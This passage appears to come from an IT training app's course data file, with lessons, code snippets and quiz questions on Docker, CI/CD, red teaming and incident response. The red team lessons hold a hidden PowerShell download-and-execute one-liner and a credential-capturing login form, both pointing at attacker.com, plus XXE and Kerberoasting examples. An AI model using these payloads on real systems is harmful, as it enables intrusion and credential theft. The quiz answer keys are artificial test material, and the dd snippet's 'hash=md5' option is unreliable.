              'The Control Plane',
              'The MAC addresses',
              'The physical cables'
            ],
            correctIndex: 1,
            explanation: 'SDN decouples the Control Plane (which decides where traffic goes) from the Data Plane (the hardware that actually forwards the traffic).'
          }
        }
      ]
    },
    {
      id: 'mod_docker_dive',
      code: '1.7',
      title: 'Docker & Container Orchestration Deep Dive',
      description: 'Master containerization, image optimization, and Docker Swarm/Compose ecosystems.',
      lessons: [
        {
          id: 'deep_it_dock_1',
          title: 'Dockerfile Optimization & Multi-stage Builds',
          duration: '25 min',
          durationSeconds: 1500,
          completed: false,
          keyTakeaway: 'Multi-stage builds drastically reduce final image size by discarding build tools and intermediate artifacts.',
          codeSnippet: 'FROM golang:1.19 AS builder\nWORKDIR /app\nCOPY . .\nRUN go build -o myapp\n\nFROM alpine:latest\nCOPY --from=builder /app/myapp /myapp\nCMD ["/myapp"]',
          drillQuestion: {
            id: 'q_deep_it_dock_1',
            prompt: 'Why are multi-stage builds recommended for compiled languages like Go or Rust?',
            options: [
              'They execute code faster at runtime',
              'They prevent cache misses',
              'They allow compilation in one stage and packaging in a smaller runtime image',
              'They bypass Docker\'s security model'
            ],
            correctIndex: 2,
            explanation: 'Multi-stage builds leave behind massive compiler toolchains, resulting in a tiny, secure production image that only contains the final binary.'
          }
        },
        {
          id: 'deep_it_dock_2',
          title: 'Docker Networking',
          duration: '25 min',
          durationSeconds: 1500,
          completed: false,
          keyTakeaway: 'Docker offers bridge (default local), host (bypassing isolation), and overlay (multi-host Swarm) networking drivers.',
          codeSnippet: 'docker network create --driver bridge my-app-net\ndocker run -d --net my-app-net --name web nginx',
          drillQuestion: {
            id: 'q_deep_it_dock_2',
            prompt: 'What happens when a container is run with `--network host`?',
            options: [
              'It creates a private isolated bridge network',
              'It connects directly to an external overlay network',
              'It shares the host machine\'s network stack, bypassing network isolation',
              'It blocks all outgoing traffic'
            ],
            correctIndex: 2,
            explanation: 'Host networking disables Docker\'s network isolation; the container uses the host\'s IP and binds directly to the host\'s ports.'
          }
        },
        {
          id: 'deep_it_dock_3',
          title: 'Volumes and Bind Mounts',
          duration: '20 min',
          durationSeconds: 1200,
          completed: false,
          keyTakeaway: 'Volumes are managed by Docker and are ideal for persisting database data, while bind mounts tie directly to specific host file paths (great for dev code).',
          codeSnippet: '# Volume mount\ndocker run -v pgdata:/var/lib/postgresql/data postgres\n# Bind mount\ndocker run -v $(pwd):/app node index.js',
          drillQuestion: {
            id: 'q_deep_it_dock_3',
            prompt: 'Which storage mount type is fully managed by Docker and typically stored in `/var/lib/docker/volumes/`?',
            options: [
              'tmpfs mount',
              'Bind mount',
              'Volume',
              'NFS mount'
            ],
            correctIndex: 2,
            explanation: 'Volumes are the preferred mechanism for persisting data generated by and used by Docker containers, completely managed by Docker.'
          }
        },
        {
          id: 'deep_it_dock_4',
          title: 'Docker Compose for Microservices',
          duration: '25 min',
          durationSeconds: 1500,
          completed: false,
          keyTakeaway: 'Docker Compose uses a YAML file to configure and run multi-container applications on a single host, streamlining local development.',
          codeSnippet: 'version: "3.9"\nservices:\n  web:\n    image: nginx\n    ports: ["80:80"]\n  api:\n    build: .\n    depends_on: [db]\n  db:\n    image: postgres',
          drillQuestion: {
            id: 'q_deep_it_dock_4',
            prompt: 'In a `docker-compose.yml` file, what does the `depends_on` attribute control?',
            options: [
              'Which dependencies get installed via apt-get',
              'The order in which services are started',
              'Network routing rules',
              'Data volume inheritance'
            ],
            correctIndex: 1,
            explanation: '`depends_on` expresses dependency between services, causing Compose to start services in dependency order.'
          }
        },
        {
          id: 'deep_it_dock_5',
          title: 'Docker Security & Rootless Containers',
          duration: '30 min',
          durationSeconds: 1800,
          completed: false,
          keyTakeaway: 'Running the Docker daemon in Rootless mode mitigates the risk of container breakouts giving attackers root access to the host.',
          codeSnippet: '# Start docker without root privileges\ndockerd-rootless.sh --experimental',
          drillQuestion: {
            id: 'q_deep_it_dock_5',
            prompt: 'What is a major security risk of running standard Docker containers as the root user?',
            options: [
              'Images take longer to download',
              'A container breakout vulnerability could grant the attacker root privileges on the host OS',
              'Memory usage spikes',
              'It forces the use of IPv6'
            ],
            correctIndex: 1,
            explanation: 'By default, the root user inside a container is the root user on the host. If isolation fails, the attacker has full host control.'
          }
        }
      ]
    },
    {
      id: 'mod_cicd_gitops',
      code: '1.8',
      title: 'CI/CD Pipeline Engineering & GitOps',
      description: 'Automate software delivery safely, consistently, and at high velocity using modern GitOps practices.',
      lessons: [
        {
          id: 'deep_it_cicd_1',
          title: 'Continuous Integration Principles',
          duration: '20 min',
          durationSeconds: 1200,
          completed: false,
          keyTakeaway: 'CI requires developers to merge code to a shared main branch frequently, triggering automated builds and tests to detect errors early.',
          codeSnippet: '# GitHub Actions CI YAML\nname: CI\non: [push]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n    - uses: actions/checkout@v3\n    - run: npm test',
          drillQuestion: {
            id: 'q_deep_it_cicd_1',
            prompt: 'What is the primary goal of Continuous Integration (CI)?',
            options: [
              'To automatically deploy code to production',
              'To detect and address integration bugs as early as possible',
              'To eliminate the need for QA teams',
              'To write code faster'
            ],
            correctIndex: 1,
            explanation: 'CI integrates code frequently and runs automated tests to ensure that changes do not break the main codebase, shifting bug detection left.'
          }
        },
        {
          id: 'deep_it_cicd_2',
          title: 'Continuous Delivery vs Deployment',
          duration: '25 min',
          durationSeconds: 1500,
          completed: false,
          keyTakeaway: 'Continuous Delivery means code is ALWAYS ready to deploy manually. Continuous Deployment means code is AUTOMATICALLY deployed if it passes tests.',
          codeSnippet: 'deploy:\n  stage: deploy\n  script:\n    - ./deploy.sh production\n  rules:\n    - if: $CI_COMMIT_BRANCH == "main"',
          drillQuestion: {
            id: 'q_deep_it_cicd_2',
            prompt: 'Which practice automatically pushes every change that passes the CI pipeline directly into the production environment without human intervention?',
            options: [
              'Continuous Integration',
              'Continuous Delivery',
              'Continuous Deployment',
              'GitOps'
            ],
            correctIndex: 2,
            explanation: 'Continuous Deployment completely automates the pipeline all the way to production, whereas Continuous Delivery typically stops for a manual approval step.'
          }
        },
        {
          id: 'deep_it_cicd_3',
          title: 'GitOps and ArgoCD',
          duration: '35 min',
          durationSeconds: 2100,
          completed: false,
          keyTakeaway: 'GitOps uses Git as the single source of truth for infrastructure. ArgoCD continuously monitors Git and syncs changes into the Kubernetes cluster.',
          codeSnippet: 'apiVersion: argoproj.io/v1alpha1\nkind: Application\nmetadata:\n  name: guestbook\nspec:\n  source:\n    repoURL: https://github.com/argoproj/argocd-example-apps.git\n    path: guestbook\n  destination:\n    server: https://kubernetes.default.svc',
          drillQuestion: {
            id: 'q_deep_it_cicd_3',
            prompt: 'In a GitOps workflow using ArgoCD, what happens if someone manually edits a Kubernetes Deployment via `kubectl`?',
            options: [
              'ArgoCD deletes the cluster',
              'The manual change becomes the new source of truth',
              'ArgoCD detects the drift and can automatically revert the state back to match the Git repository',
              'Git automatically updates the repository with the manual change'
            ],
            correctIndex: 2,
            explanation: 'GitOps enforces the Git repository as the strict source of truth. ArgoCD detects configuration drift and syncs the cluster back to the Git state.'
          }
        },
        {
          id: 'deep_it_cicd_4',
          title: 'Infrastructure as Code (Terraform)',
          duration: '30 min',
          durationSeconds: 1800,
          completed: false,
          keyTakeaway: 'Terraform uses declarative HCL to provision cloud resources. State files must be protected and stored remotely (e.g., S3) for team collaboration.',
          codeSnippet: 'resource "aws_instance" "web" {\n  ami           = "ami-0c55b159cbfafe1f0"\n  instance_type = "t2.micro"\n}',
          drillQuestion: {
            id: 'q_deep_it_cicd_4',
            prompt: 'What is the purpose of the Terraform "state" file?',
            options: [
              'To store billing information',
              'To map real-world resources to your configuration and track metadata',
              'To automatically generate CI pipelines',
              'To write bash scripts for provisioning'
            ],
            correctIndex: 1,
            explanation: 'Terraform must store state about your managed infrastructure and configuration. This state is used to map real world resources to your configuration.'
          }
        },
        {
          id: 'deep_it_cicd_5',
          title: 'Blue-Green and Canary Deployments',
          duration: '30 min',
          durationSeconds: 1800,
          completed: false,
          keyTakeaway: 'Blue-Green deployments switch traffic instantly between two identical environments. Canary deployments route a small percentage of traffic to the new version to test stability.',
          codeSnippet: '# Istio VirtualService for Canary Routing\napiVersion: networking.istio.io/v1alpha3\nkind: VirtualService\nspec:\n  http:\n  - route:\n    - destination: { host: myapp, subset: v1 }\n      weight: 90\n    - destination: { host: myapp, subset: v2 }\n      weight: 10',
          drillQuestion: {
            id: 'q_deep_it_cicd_5',
            prompt: 'Which deployment strategy is best for identifying bugs by exposing a new feature to only 5% of users before a full rollout?',
            options: [
              'Blue-Green Deployment',
              'Canary Deployment',
              'Rolling Update',
              'Recreate Deployment'
            ],
            correctIndex: 1,
            explanation: 'A Canary deployment gradually rolls out the change to a small subset of users, monitoring metrics before shifting all traffic.'
          }
        }
      ]
    },
    {
      id: 'mod_red_team',
      code: '1.9',
      title: 'Offensive Security: Red Team Operations & Bug Bounty',
      description: 'Think like an attacker. Learn advanced persistence, evasion, and bug hunting.',
      lessons: [
        {
          id: 'deep_it_red_1',
          title: 'The Cyber Kill Chain Framework',
          duration: '20 min',
          durationSeconds: 1200,
          completed: false,
          keyTakeaway: 'The Cyber Kill Chain breaks down cyberattacks into stages: Reconnaissance, Weaponization, Delivery, Exploitation, Installation, C2, and Actions on Objectives.',
          codeSnippet: '// Conceptual attacker mindset: \n// Recon -> Weaponize -> Deliver -> Exploit -> Install -> C2 -> Exfiltrate',
          drillQuestion: {
            id: 'q_deep_it_red_1',
            prompt: 'In the Cyber Kill Chain, what does the "Command and Control" (C2) phase represent?',
            options: [
              'Gathering email addresses of the target company',
              'Sending a phishing email',
              'The compromised system communicating back to the attacker\'s server for instructions',
              'Deleting the final stolen database'
            ],
            correctIndex: 2,
            explanation: 'Command and Control (C2) establishes a communication channel between the compromised host and the attacker to issue commands remotely.'
          }
        },
        {
          id: 'deep_it_red_2',
          title: 'Active Directory Attacks & Kerberoasting',
          duration: '35 min',
          durationSeconds: 2100,
          completed: false,
          keyTakeaway: 'Active Directory is the backbone of enterprise IT. Kerberoasting allows attackers to extract service account ticket hashes and crack them offline.',
          codeSnippet: '# Using Impacket to Kerberoast\nGetUserSPNs.py domain.local/user:password -request',
          drillQuestion: {
            id: 'q_deep_it_red_2',
            prompt: 'What is the primary goal of a Kerberoasting attack?',
            options: [
              'To DDoS the Domain Controller',
              'To request Service Principal Name (SPN) tickets and crack their hashed passwords offline',
              'To reset the Domain Admin password',
              'To bypass firewall rules'
            ],
            correctIndex: 1,
            explanation: 'Kerberoasting extracts TGS (Ticket Granting Service) tickets for service accounts. Attackers crack the encrypted portion offline to recover the plaintext password.'
          }
        },
        {
          id: 'deep_it_red_3',
          title: 'Bypassing Antivirus and EDR (Evasion)',
          duration: '35 min',
          durationSeconds: 2100,
          completed: false,
          keyTakeaway: 'Red teams use obfuscation, memory-only execution (living off the land), and API unhooking to evade Endpoint Detection and Response (EDR) systems.',
          codeSnippet: '# PowerShell in-memory execution bypassing disk\npowershell.exe -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\'http://attacker.com/payload.ps1\')"',
          drillQuestion: {
            id: 'q_deep_it_red_3',
            prompt: 'What is a "Living off the Land" (LotL) attack?',
            options: [
              'An attack against agricultural infrastructure',
              'Using custom malware written in C',
              'Utilizing legitimate, pre-installed administrative tools (like PowerShell or WMI) to conduct malicious actions',
              'Exploiting physical data centers'
            ],
            correctIndex: 2,
            explanation: 'LotL techniques use existing trusted binaries (LOLBins) to execute attacks, blending in with normal administrative traffic to evade detection.'
          }
        },
        {
          id: 'deep_it_red_4',
          title: 'Advanced Web Exploits (SSRF & XXE)',
          duration: '30 min',
          durationSeconds: 1800,
          completed: false,
          keyTakeaway: 'SSRF forces a server to make requests on the attacker\'s behalf (often hitting internal metadata APIs). XXE exploits XML parsers to read local files.',
          codeSnippet: '<!-- XXE Payload example -->\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>\n<data>&xxe;</data>',
          drillQuestion: {
            id: 'q_deep_it_red_4',
            prompt: 'What is a common, high-value target for Server-Side Request Forgery (SSRF) attacks in cloud environments?',
            options: [
              'The website\'s CSS files',
              'The Cloud Provider\'s Metadata API (e.g., `169.254.169.254`)',
              'The local browser cache',
              'The public DNS records'
            ],
            correctIndex: 1,
            explanation: 'Attackers use SSRF to make the web server request the cloud metadata endpoint (169.254.169.254), often extracting temporary IAM credentials.'
          }
        },
        {
          id: 'deep_it_red_5',
          title: 'Bug Bounty Methodology',
          duration: '25 min',
          durationSeconds: 1500,
          completed: false,
          keyTakeaway: 'Successful bug hunting relies on deep reconnaissance (subdomain enumeration, finding hidden APIs) rather than just running automated scanners.',
          codeSnippet: '# Subdomain enumeration using Amass\namass enum -d target.com -o subdomains.txt',
          drillQuestion: {
            id: 'q_deep_it_red_5',
            prompt: 'In Bug Bounty hunting, why is subdomain enumeration critical?',
            options: [
              'It automatically hacks the server',
              'It expands the attack surface by finding forgotten, unpatched, or development applications',
              'It encrypts the bug hunter\'s traffic',
              'It validates SSL certificates'
            ],
            correctIndex: 1,
            explanation: 'Organizations often forget about old or staging subdomains, making them prime targets for vulnerabilities that might be patched on the main site.'
          }
        },
        {
          id: 'deep_it_red_6',
          title: 'Social Engineering and Phishing',
          duration: '20 min',
          durationSeconds: 1200,
          completed: false,
          keyTakeaway: 'The human element remains the weakest link. Phishing, spear-phishing, and pretexting bypass technical controls by manipulating psychology.',
          codeSnippet: '<!-- Example of a cloned login page form capturing creds -->\n<form action="http://attacker.com/login" method="POST">\n  <input type="text" name="username">\n  <input type="password" name="password">\n</form>',
          drillQuestion: {
            id: 'q_deep_it_red_6',
            prompt: 'How does "Spear Phishing" differ from standard Phishing?',
            options: [
              'It uses SMS instead of email',
              'It is automated and sent to millions of people simultaneously',
              'It is highly targeted and customized for a specific individual or organization',
              'It only targets mobile devices'
            ],
            correctIndex: 2,
            explanation: 'Spear phishing utilizes gathered intelligence to create highly personalized, convincing lures targeted at specific high-value individuals.'
          }
        }
      ]
    },
    {
      id: 'mod_incident_response',
      code: '1.10',
      title: 'Incident Response, SIEM & Digital Forensics',
      description: 'Detect, contain, and eradicate threats. Analyze malware and piece together digital evidence.',
      lessons: [
        {
          id: 'deep_it_ir_1',
          title: 'The Incident Response Lifecycle',
          duration: '25 min',
          durationSeconds: 1500,
          completed: false,
          keyTakeaway: 'The NIST IR Lifecycle consists of Preparation, Detection & Analysis, Containment Eradication & Recovery, and Post-Incident Activity.',
          codeSnippet: '# Sample incident response playbook steps:\n# 1. Isolate host from network\n# 2. Capture memory dump\n# 3. Analyze logs',
          drillQuestion: {
            id: 'q_deep_it_ir_1',
            prompt: 'During which phase of the Incident Response lifecycle should an organization write playbooks and train their staff?',
            options: [
              'Detection & Analysis',
              'Preparation',
              'Containment',
              'Post-Incident Activity'
            ],
            correctIndex: 1,
            explanation: 'Preparation involves establishing the tools, processes, playbooks, and training necessary to handle an incident before it happens.'
          }
        },
        {
          id: 'deep_it_ir_2',
          title: 'SIEM and Log Aggregation',
          duration: '30 min',
          durationSeconds: 1800,
          completed: false,
          keyTakeaway: 'SIEMs (like Splunk or ELK) aggregate logs from across the enterprise, using correlation rules to detect anomalies and alert analysts.',
          codeSnippet: '// Sample Splunk SPL Query finding failed logins\nindex=security EventCode=4625 | stats count by TargetUserName | sort - count',
          drillQuestion: {
            id: 'q_deep_it_ir_2',
            prompt: 'What does SIEM stand for?',
            options: [
              'System Information and Event Monitoring',
              'Security Information and Event Management',
              'Standard Integration of Enterprise Malware',
              'Secure Interface for Endpoint Management'
            ],
            correctIndex: 1,
            explanation: 'Security Information and Event Management (SIEM) solutions provide real-time analysis of security alerts generated by applications and network hardware.'
          }
        },
        {
          id: 'deep_it_ir_3',
          title: 'Digital Forensics & Evidence Preservation',
          duration: '30 min',
          durationSeconds: 1800,
          completed: false,
          keyTakeaway: 'Forensics requires strict Chain of Custody and working on bit-by-bit copies (using write-blockers) to preserve the original evidence integrity.',
          codeSnippet: '# Create a raw bit-for-bit image using dd over a write-blocker\ndd if=/dev/sdb of=/mnt/evidence/image.dd bs=4M hash=md5',
          drillQuestion: {
            id: 'q_deep_it_ir_3',
            prompt: 'Why is it crucial to calculate a cryptographic hash (like SHA-256) of a hard drive image immediately after acquisition?',
            options: [
              'To decrypt the drive',
              'To compress the file size',
              'To prove that the evidence has not been altered since it was copied',
              'To execute the malware safely'
            ],
            correctIndex: 2,
            explanation: 'Hashes act as digital fingerprints. Matching hashes before and after analysis proves the evidence remained pristine and was not tampered with.'
          }
        },
        {
          id: 'deep_it_ir_4',
          title: 'Memory Forensics (Volatility)',
          duration: '35 min',
          durationSeconds: 2100,
          completed: false,
          keyTakeaway: 'RAM contains volatile evidence like active network connections, running processes, and decrypted keys that are lost when a system shuts down.',
          codeSnippet: '# Using Volatility to list processes from a memory dump\nvolatility -f memdump.mem --profile=Win10x64_18362 pslist',
          drillQuestion: {
            id: 'q_deep_it_ir_4',
            prompt: 'Why would an investigator prioritize capturing a RAM dump before unplugging a compromised server?',
            options: [
              'RAM is needed to restart the server',
              'RAM holds volatile data (like running malware, network connections, and encryption keys) that disappears on shutdown',
              'To save electricity',
              'To backup the hard drive'
            ],
            correctIndex: 1,
            explanation: 'Volatile memory is erased when power is lost. Capturing it immediately is critical for finding fileless malware or active command-and-control connections.'
          }
        },
        {
          id: 'deep_it_ir_5',
          title: 'Threat Hunting & YARA Rules',
          duration: '30 min',
          durationSeconds: 1800,
          completed: false,
          keyTakeaway: 'Threat hunting is proactive. Analysts write YARA rules (pattern matching for malware) to sweep the network for Indicators of Compromise (IoCs).',
          codeSnippet: 'rule Ransomware_String {\n    strings:\n        $s1 = "Your files have been encrypted"\n        $s2 = ".onion"\n    condition:\n        any of them\n}',
          drillQuestion: {
            id: 'q_deep_it_ir_5',
            prompt: 'What is the primary purpose of a YARA rule?',
            options: [
              'To block incoming DDoS attacks',
              'To identify and classify malware based on textual or binary patterns',
              'To encrypt sensitive network traffic',
              'To update firewall configurations'
            ],
            correctIndex: 1,
            explanation: 'YARA rules define specific patterns (strings, hex sequences) used by analysts to identify and classify malware across systems.'
          }
        }
      ]
    }
  ]
};


